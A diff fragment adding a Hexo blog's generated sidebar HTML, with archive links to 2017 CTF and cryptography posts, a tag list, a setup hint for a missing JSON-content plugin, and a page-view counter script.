+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href= "/2017/05/17/2017-CUMTCTF-Final/" >2017-CUMTCTF-Final</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">web</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">CBC</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">CRC</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">serialize</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">hexo</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">php_black_magic</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">RSA</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">ssrf</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">xss</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">cms</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">docker</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">.git</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">writeup</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">crypto</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">sql</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">ShadowSocks</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">xml</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">misc</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">.htaccess</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">ECC</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">计网考试</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">心情随笔</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">flask</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">websummary</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">微机实验</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">微机考试</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">马原考试</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">微机实验考试</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">Algorithm</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: false
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
